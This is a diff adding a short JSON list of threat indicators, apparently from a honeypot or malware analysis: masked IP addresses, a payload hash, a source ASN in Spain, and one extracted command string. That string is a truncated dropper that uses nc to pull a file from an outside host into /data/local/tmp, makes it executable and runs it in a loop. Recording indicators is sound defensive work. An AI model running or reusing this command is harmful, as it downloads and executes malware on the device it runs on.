@@ -1,0 +1,27 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "85.11.167.XXX"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "9ec0680c88c20f69df67aeb8d42406a10356412220582ef072b79644c12ed752"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "sh -c \"cd /data/local/tmp; nc 85.11.167.XXX 25565 > .system-update; chmod +x .system-update; (while true; do ./.system-u"
+  },
+  {
+    "asn": "Calpe Networks Sl",
+    "country": "Spain",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "5.59.109.XXX"
+  }
+]
